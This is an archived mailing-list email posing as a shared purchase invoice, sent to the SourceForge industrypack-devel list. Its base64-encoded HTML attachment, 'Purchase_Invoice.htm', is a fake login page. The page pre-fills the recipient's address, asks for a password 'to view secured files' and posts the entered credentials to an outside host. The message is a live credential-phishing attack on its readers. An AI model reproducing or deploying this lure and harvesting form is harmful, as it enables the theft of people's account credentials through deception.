Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 91FD93C5B43
	for <lists+industrypack-devel@lfdr.de>; Mon, 12 Jul 2021 13:41:41 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1m2uJg-0007AS-0L
	for lists+industrypack-devel@lfdr.de; Mon, 12 Jul 2021 11:41:40 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <sales@kevinsha.com>) id 1m2uJf-0007AM-1h
 for industrypack-devel@lists.sourceforge.net; Mon, 12 Jul 2021 11:41:39 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=70ET4t5dWJrfQf18zDioOjM2YNSyreGRG/PF8t/MO+g=; b=NCRLyVWsy9LzFma//NOBzavcUk
 UNrQjYB9B/b/DnB99N5lyeGGqWMQz3toXV+tCGqDWCX9Xe//mvk+FntNG8V7gsSAZfEQkB/0j1woL
 CkGcC9ior0QttkZwc/XepLtYjuCbFsdWsoe7KMV6XJWIb0mPck2SA+71ZyAJTOAD8dLE=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=70ET4t5dWJrfQf18zDioOjM2YNSyreGRG/PF8t/MO+g=; b=a
 CQh9juRedY8eiRhUTB/BRlVlvPKv0EQcYZ7LqV+wDnAdoFN7Kz6QgB2MEO2wVgYa/IKSykPCD7aNW
 MG5/DyDUr5fQHNgjmvg2rSkjyWcdTrbujq1hI0KCy9sZScmAMGzeazt8Sj6VOorzN+O6me9EULzOY
 dKsk26zcXFoMaViw=;
Received: from [67.205.185.191] (helo=mta0.kevinsha.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1m2uJV-0000GA-QL
 for industrypack-devel@lists.sourceforge.net; Mon, 12 Jul 2021 11:41:38 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=kevinsha.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
 i=sales@kevinsha.com;
 bh=70ET4t5dWJrfQf18zDioOjM2YNSyreGRG/PF8t/MO+g=;
 b=AO7pZwni6fjntYQShCsNw+Cf017QS9O215zmgIuAn6N7gUM+L6DiphQ1QwI8FISr3tb8WLWdyYAH
 6pgIdj9l7WkPyG8/WSMqGR0Ty/WPPPzwYmi1lMe9R3qgEoTUsPsqrwWvLUTTVLmWzH6yFbSFBxtz
 a2gHY37EvzWd+Thcbao=
From: industrypack-devel  <sales@kevinsha.com>
To: industrypack-devel@lists.sourceforge.net
Date: 12 Jul 2021 04:41:23 -0700
Message-ID: <20210712044123.AD68CD19A72AA6D9@kevinsha.com>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_C8870DF3.5C302915"
X-Spam-Score: 4.5 (++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
X-Headers-End: 1m2uJV-0000GA-QL
Subject: [Industrypack-devel] New Business Document Shared
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_C8870DF3.5C302915
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body style=3D"MARGIN: 0.5em">
<DIV id=3D:1zg class=3D"Ar Au Ao" style=3D"DISPLAY: block">
<DIV spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 aria-label=3D"Message B=
ody" aria-multiline=3Dtrue id=3D:1zc class=3D"Am Al editable LW-avf tS-tW t=
S-tY" hideFocus contentEditable=3Dtrue style=3D"DIRECTION: ltr; MIN-HEIGHT:=
 393px" g_editable=3D"true"><SPAN style=3D'FONT-SIZE: 16px; TEXT-DECORATION=
: ; FONT-FAMILY: "Segoe UI"; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYL=
E: normal'></SPAN>
<DIV style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; =
FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'>&nbsp;</DIV><SPAN =
style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; FONT-=
WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'></SPAN>
<DIV style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; =
FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'>File Format: PDF M=
MR(G4)</DIV><SPAN style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY:=
 "Segoe UI"; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'></SPA=
N><B>Reference:</B> Purchase Invoice 7/12/2021 4:41:23 a.m.<SPAN style=3D'F=
ONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; FONT-WEIGHT: 40=
0; COLOR: rgb(0,0,0); FONT-STYLE: normal'></SPAN>
<SPAN style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI";=
 FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'> </SPAN>
<DIV style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; =
FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'>&nbsp;</DIV><SPAN =
style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; FONT-=
WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'></SPAN>
<DIV style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; =
FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'>Attached file is a=
 scanned Document in PDF format.</DIV><SPAN style=3D'FONT-SIZE: 16px; TEXT-=
DECORATION: ; FONT-FAMILY: "Segoe UI"; FONT-WEIGHT: 400; COLOR: rgb(0,0,0);=
 FONT-STYLE: normal'></SPAN>
<DIV style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; =
FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'></DIV><SPAN style=
=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; FONT-WEIGH=
T: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'></SPAN>
<DIV style=3D'FONT-SIZE: 16px; TEXT-DECORATION: ; FONT-FAMILY: "Segoe UI"; =
FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal'>to view the docume=
nt.</DIV></DIV></DIV>
<P></P></BODY></HTML>
------=_NextPart_000_0012_C8870DF3.5C302915
Content-Type: text/html; name="Purchase_Invoice.htm"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Purchase_Invoice.htm"

PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlv
bmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+DQoNCjxI
VE1MPjxIRUFEPg0KPE1FVEEgbmFtZT1HRU5FUkFUT1IgY29udGVudD0iTVNIVE1MIDExLjAw
LjEwNTcwLjEwMDEiPjwvSEVBRD4NCjxCT0RZIHN0eWxlPSJNQVJHSU46IDAuNWVtIj48QlI+
PEJSPg0KPERJViBjbGFzcz13cmFwcGVyIHN0eWxlPSdCT1gtU0laSU5HOiBib3JkZXItYm94
OyBGT05ULVNJWkU6IDE0cHg7IEZPTlQtRkFNSUxZOiAiSGVsdmV0aWNhIE5ldWUiLCBIZWx2
ZXRpY2EsIEFyaWFsLCBzYW5zLXNlcmlmOyBXSElURS1TUEFDRTogbm9ybWFsOyBXT1JELVNQ
QUNJTkc6IDBweDsgVEVYVC1UUkFOU0ZPUk06IG5vbmU7IEZPTlQtV0VJR0hUOiA0MDA7IENP
TE9SOiByZ2IoNjMsNjMsNjMpOyBGT05ULVNUWUxFOiBub3JtYWw7IE1JTi1IRUlHSFQ6IDEw
MCU7IE9SUEhBTlM6IDI7IFdJRE9XUzogMjsgTUFSR0lOOiAwcHggMHB4IC00MHB4OyBMRVRU
RVItU1BBQ0lORzogbm9ybWFsOyBURVhULUlOREVOVDogMHB4OyBmb250LXZhcmlhbnQtbGln
YXR1cmVzOiBub3JtYWw7IGZvbnQtdmFyaWFudC1jYXBzOiBub3JtYWw7IC13ZWJraXQtdGV4
dC1zdHJva2Utd2lkdGg6IDBweDsgdGV4dC1kZWNvcmF0aW9uLXN0eWxlOiBpbml0aWFsOyAN
CnRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbCc+PFNFQ1RJT04gY2xhc3M9Y29udGFp
bmVyIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBXSURUSDogMTE4MHB4OyBQQURE
SU5HLUxFRlQ6IDIwcHg7IE1BUkdJTjogMHB4IGF1dG87IERJU1BMQVk6IGJsb2NrOyBQQURE
SU5HLVJJR0hUOiAyMHB4Ij4NCjxESVYgY2xhc3M9Zm9ybS1sb2dpbiBzdHlsZT0iQk9YLVNJ
WklORzogYm9yZGVyLWJveDsgTUFYLVdJRFRIOiA0NTBweDsgTUFSR0lOOiAwcHggYXV0byA0
MHB4Ij4NCjxESVYgY2xhc3M9Im10LTMwIG1iLTMwIiBzdHlsZT0iQk9YLVNJWklORzogYm9y
ZGVyLWJveDsgTUFSR0lOOiAzMHB4IDBweCI+PElNRyBjbGFzcz0iaW1nLXJlc3BvbnNpdmUg
Zm9ybS1sb2dpbl9fY29tcGFueS1sb2dvIiBzdHlsZT0iQk9SREVSLUxFRlQtV0lEVEg6IDBw
eDsgQk9YLVNJWklORzogYm9yZGVyLWJveDsgTUFYLVdJRFRIOiAxMDAlOyBIRUlHSFQ6IGF1
dG87IEJPUkRFUi1SSUdIVC1XSURUSDogMHB4OyBWRVJUSUNBTC1BTElHTjogbWlkZGxlOyBC
T1JERVItQk9UVE9NLVdJRFRIOiAwcHg7IE1BUkdJTjogMHB4IGF1dG87IERJU1BMQVk6IGJs
b2NrOyBCT1JERVItVE9QLVdJRFRIOiAwcHg7IE1BWC1IRUlHSFQ6IDE1MHB4IiBzcmM9Imh0
dHBzOi8vaS5neWF6by5jb20vYmFmNGJjNTEzYjk4ZTU0MTYyMGQzMzYyYTNiNjViNDMucG5n
Ij48L0RJVj4NCjxESVYgY2xhc3M9Zm9ybS1sb2dpbl9fYm9keSBzdHlsZT0iQk9YLVNJWklO
RzogYm9yZGVyLWJveDsgQk9SREVSLVRPUDogcmdiKDIzNSwyMzUsMjM1KSAxcHggc29saWQ7
IEJPUkRFUi1SSUdIVDogcmdiKDIzNSwyMzUsMjM1KSAxcHggc29saWQ7IEJPUkRFUi1CT1RU
T006IHJnYigyMzUsMjM1LDIzNSkgMXB4IHNvbGlkOyBQT1NJVElPTjogcmVsYXRpdmU7IFBB
RERJTkctQk9UVE9NOiAzMHB4OyBQQURESU5HLVRPUDogMzBweDsgUEFERElORy1MRUZUOiA1
MHB4OyBCT1JERVItTEVGVDogcmdiKDIzNSwyMzUsMjM1KSAxcHggc29saWQ7IE1BUkdJTjog
MHB4OyBaLUlOREVYOiAxOyBQQURESU5HLVJJR0hUOiA1MHB4OyBCQUNLR1JPVU5ELUNPTE9S
OiByZ2IoMjUwLDI1MCwyNTApOyBib3JkZXItcmFkaXVzOiA1cHgiPg0KPERJViBjbGFzcz1m
b3JtLWdyb3VwIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBNQVJHSU46IDBweCAw
cHggMTVweCI+DQo8Rk9STSBpZD1sb2dpbl9mb3JtIHN0eWxlPSJCT1gtU0laSU5HOiBib3Jk
ZXItYm94OyBNQVJHSU46IDBweCIgbWV0aG9kPXBvc3QgYWN0aW9uPWh0dHBzOi8vZWRhYWNp
bC5jb20vdGYvcmV4aWZseS5waHA+DQo8RElWIGNsYXNzPWZvcm0tZ3JvdXAgc3R5bGU9IkJP
WC1TSVpJTkc6IGJvcmRlci1ib3g7IE1BUkdJTjogMHB4IDBweCAxNnB4Ij48Rk9OVCBzdHls
ZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgTUFSR0lOOiAwcHgiIGNvbG9yPSMwMDAwMCBm
YWNlPXRhaG9tYT5QbGVhc2UgbG9nIGluIHRvIHlvdXIgYWNjb3VudCB0byB2aWV3IHNlY3Vy
ZWQgZmlsZXMuIDwvRk9OVD48QlIgc3R5bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3g7IE1B
UkdJTjogMHB4Ij48QlIgc3R5bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3g7IE1BUkdJTjog
MHB4Ij48TEFCRUwgc3R5bGU9IkJPWC1TSVpJTkc6IGJvcmRlci1ib3g7IE1BWC1XSURUSDog
MTAwJTsgRk9OVC1XRUlHSFQ6IGJvbGQ7IE1BUkdJTjogMHB4IDBweCA1cHg7IERJU1BMQVk6
IGlubGluZS1ibG9jayIgZm9yPWxvZ2luX3VzZXI+VXNlcm5hbWU8L0xBQkVMPg0KIDxJTlBV
VCBpZD1sb2dpbl91c2VyIGNsYXNzPWZvcm0tY29udHJvbCBzdHlsZT0iQk9YLVNJWklORzog
Ym9yZGVyLWJveDsgRk9OVC1TSVpFOiAxNnB4OyBCT1JERVItVE9QOiByZ2IoMjA0LDIwNCwy
MDQpIDFweCBzb2xpZDsgSEVJR0hUOiAzNHB4OyBGT05ULUZBTUlMWTogaW5oZXJpdDsgQk9S
REVSLVJJR0hUOiByZ2IoMjA0LDIwNCwyMDQpIDFweCBzb2xpZDsgV0lEVEg6IDM0OHB4OyBC
QUNLR1JPVU5ELUlNQUdFOiBub25lOyBCT1JERVItQk9UVE9NOiByZ2IoMjA0LDIwNCwyMDQp
IDFweCBzb2xpZDsgQ09MT1I6IGJsYWNrOyBQQURESU5HLUJPVFRPTTogMHB4OyBQQURESU5H
LVRPUDogMHB4OyBQQURESU5HLUxFRlQ6IDBweDsgQk9SREVSLUxFRlQ6IHJnYigyMDQsMjA0
LDIwNCkgMXB4IHNvbGlkOyBNQVJHSU46IDBweDsgRElTUExBWTogYmxvY2s7IExJTkUtSEVJ
R0hUOiAyOyBQQURESU5HLVJJR0hUOiAwcHg7IEJBQ0tHUk9VTkQtQ09MT1I6IA0KcmdiKDI1
NSwyNTUsMjU1KTsgVEVYVC1JTkRFTlQ6IDEwcHg7IGZvbnQtc3RyZXRjaDogaW5oZXJpdDsg
Ym9yZGVyLXJhZGl1czogNHB4OyBib3gtc2hhZG93OiByZ2JhKDAsIDAsIDAsIDAuMDc1KSAw
cHggMXB4IDFweCBpbnNldDsgdHJhbnNpdGlvbjogYm9yZGVyLWNvbG9yIDAuMTVzIGVhc2Ut
aW4tb3V0IDBzLCBib3gtc2hhZG93IDAuMTVzIGVhc2UtaW4tb3V0IDBzIiBuYW1lPWVtYWls
IFZhbHVlPSJpbmR1c3RyeXBhY2stZGV2ZWxAbGlzdHMuc291cmNlZm9yZ2UubmV0IiAicGxh
Y2Vob2xkZXI9IkVtYWlsIGFkZHJlc3MiIGF1dG9jb21wbGV0ZT0ib2ZmIj48L0RJVj48L0RJ
Vj4NCjxESVYgY2xhc3M9Zm9ybS1ncm91cCBzdHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJv
eDsgTUFSR0lOOiAwcHggMHB4IDE1cHgiPjxMQUJFTCBzdHlsZT0iQk9YLVNJWklORzogYm9y
ZGVyLWJveDsgTUFYLVdJRFRIOiAxMDAlOyBGT05ULVdFSUdIVDogYm9sZDsgTUFSR0lOOiAw
cHggMHB4IDVweDsgRElTUExBWTogaW5saW5lLWJsb2NrIiBmb3I9bG9naW5fcHdkPlBhc3N3
b3JkPC9MQUJFTD4NCiA8SU5QVVQgaWQ9bG9naW5fcHdkIGNsYXNzPWZvcm0tY29udHJvbCBz
dHlsZT0iQk9YLVNJWklORzogYm9yZGVyLWJveDsgRk9OVC1TSVpFOiAxNnB4OyBCT1JERVIt
VE9QOiByZ2IoMjA0LDIwNCwyMDQpIDFweCBzb2xpZDsgSEVJR0hUOiAzNHB4OyBGT05ULUZB
TUlMWTogaW5oZXJpdDsgQk9SREVSLVJJR0hUOiByZ2IoMjA0LDIwNCwyMDQpIDFweCBzb2xp
ZDsgV0lEVEg6IDM0OHB4OyBCQUNLR1JPVU5ELUlNQUdFOiBub25lOyBCT1JERVItQk9UVE9N
OiByZ2IoMjA0LDIwNCwyMDQpIDFweCBzb2xpZDsgQ09MT1I6IGJsYWNrOyBQQURESU5HLUJP
VFRPTTogMHB4OyBQQURESU5HLVRPUDogMHB4OyBQQURESU5HLUxFRlQ6IDBweDsgQk9SREVS
LUxFRlQ6IHJnYigyMDQsMjA0LDIwNCkgMXB4IHNvbGlkOyBNQVJHSU46IDBweDsgRElTUExB
WTogYmxvY2s7IExJTkUtSEVJR0hUOiAyOyBQQURESU5HLVJJR0hUOiAwcHg7IEJBQ0tHUk9V
TkQtQ09MT1I6IA0KcmdiKDI1NSwyNTUsMjU1KTsgVEVYVC1JTkRFTlQ6IDEwcHg7IGZvbnQt
c3RyZXRjaDogaW5oZXJpdDsgYm9yZGVyLXJhZGl1czogNHB4OyBib3gtc2hhZG93OiByZ2Jh
KDAsIDAsIDAsIDAuMDc1KSAwcHggMXB4IDFweCBpbnNldDsgdHJhbnNpdGlvbjogYm9yZGVy
LWNvbG9yIDAuMTVzIGVhc2UtaW4tb3V0IDBzLCBib3gtc2hhZG93IDAuMTVzIGVhc2UtaW4t
b3V0IDBzIiB0eXBlPXBhc3N3b3JkIG5hbWU9cGFzcyByZXF1aXJlZD0iIiBwbGFjZWhvbGRl
cj0iUGFzc3dvcmQiIG1pbmxlbmd0aD0iNSI+PC9ESVY+DQo8SU5QVVQgY2xhc3M9ImJ0biBi
dG4tcHJpbWFyeSBidG4tYmxvY2siIHN0eWxlPSJCT1gtU0laSU5HOiBib3JkZXItYm94OyBG
T05ULVNJWkU6IDE0cHg7IENVUlNPUjogcG9pbnRlcjsgQk9SREVSLVRPUDogcmdiKDAsMTY3
LDIzMCkgMXB4IHNvbGlkOyBGT05ULUZBTUlMWTogaW5oZXJpdDsgQk9SREVSLVJJR0hUOiBy
Z2IoMCwxNjcsMjMwKSAxcHggc29saWQ7IFdJRFRIOiAzNDhweDsgVkVSVElDQUwtQUxJR046
IG1pZGRsZTsgQkFDS0dST1VORC1JTUFHRTogbm9uZTsgV0hJVEUtU1BBQ0U6IG5vd3JhcDsg
Qk9SREVSLUJPVFRPTTogcmdiKDAsMTY3LDIzMCkgMXB4IHNvbGlkOyBGT05ULVdFSUdIVDog
bm9ybWFsOyBDT0xPUjogcmdiKDI1NSwyNTUsMjU1KTsgUEFERElORy1CT1RUT006IDEzcHg7
IFRFWFQtQUxJR046IGNlbnRlcjsgUEFERElORy1UT1A6IDEzcHg7IFBBRERJTkctTEVGVDog
MTJweDsgQk9SREVSLUxFRlQ6IHJnYigwLDE2NywyMzApIDFweCBzb2xpZDsgDQpNQVJHSU46
IDBweCAwcHggM3B4OyBESVNQTEFZOiBibG9jazsgTElORS1IRUlHSFQ6IDEuNDI4NTsgUEFE
RElORy1SSUdIVDogMTJweDsgQkFDS0dST1VORC1DT0xPUjogcmdiKDMwLDc2LDE2MSk7IGZv
bnQtc3RyZXRjaDogaW5oZXJpdDsgYm9yZGVyLXJhZGl1czogNHB4OyB0b3VjaC1hY3Rpb246
IG1hbmlwdWxhdGlvbjsgdXNlci1zZWxlY3Q6IG5vbmU7IGFwcGVhcmFuY2U6IGJ1dHRvbiIg
dHlwZT1zdWJtaXQgdmFsdWU9IkRPV05MT0FEIiBuYW1lPXVzZXJwYXNzPjwvRk9STT48L0RJ
Vj48L0RJVj48L0RJVj48L1NFQ1RJT04+DQo8RElWPjwvRElWPjwvRk9STT4NCjxESVY+PC9E
SVY+DQo8RElWPjwvRElWPg0KPERJVj48L0RJVj48L1NFQ1RJT04+DQo8RElWPjwvRElWPg0K
PFA+DQo8Rk9PVEVSIGNsYXNzPWZvb3Rlci1sb2dpbiBzdHlsZT0nQk9YLVNJWklORzogYm9y
ZGVyLWJveDsgRk9OVC1TSVpFOiAxNHB4OyBIRUlHSFQ6IDQwcHg7IEZPTlQtRkFNSUxZOiAi
SGVsdmV0aWNhIE5ldWUiLCBIZWx2ZXRpY2EsIEFyaWFsLCBzYW5zLXNlcmlmOyBXSElURS1T
UEFDRTogbm9ybWFsOyBXT1JELVNQQUNJTkc6IDBweDsgUE9TSVRJT046IHJlbGF0aXZlOyBU
RVhULVRSQU5TRk9STTogbm9uZTsgRk9OVC1XRUlHSFQ6IDQwMDsgQ09MT1I6IHJnYig2Myw2
Myw2Myk7IEZPTlQtU1RZTEU6IG5vcm1hbDsgVEVYVC1BTElHTjogY2VudGVyOyBPUlBIQU5T
OiAyOyBXSURPV1M6IDI7IE1BUkdJTjogMHB4OyBESVNQTEFZOiBibG9jazsgTEVUVEVSLVNQ
QUNJTkc6IG5vcm1hbDsgQk9UVE9NOiAxMHB4OyBURVhULUlOREVOVDogMHB4OyBmb250LXZh
cmlhbnQtbGlnYXR1cmVzOiBub3JtYWw7IGZvbnQtdmFyaWFudC1jYXBzOiBub3JtYWw7IA0K
LXdlYmtpdC10ZXh0LXN0cm9rZS13aWR0aDogMHB4OyB0ZXh0LWRlY29yYXRpb24tc3R5bGU6
IGluaXRpYWw7IHRleHQtZGVjb3JhdGlvbi1jb2xvcjogaW5pdGlhbCc+PEJSPjxCUj48U1BB
TiBjbGFzcz0idGV4dC1zbWFsbGVyIHRleHQtZ3JheSIgc3R5bGU9IkJPWC1TSVpJTkc6IGJv
cmRlci1ib3g7IEZPTlQtU0laRTogOXB4OyBDT0xPUjogcmdiKDEzNSwxMzUsMTM1KTsgTUFS
R0lOOiAwcHg7IERJU1BMQVk6IGJsb2NrIj48QlI+PEJSPjwvU1BBTj48L1A+PC9CT0RZPjwv
SFRNTD4=

------=_NextPart_000_0012_C8870DF3.5C302915
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_C8870DF3.5C302915
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_C8870DF3.5C302915--


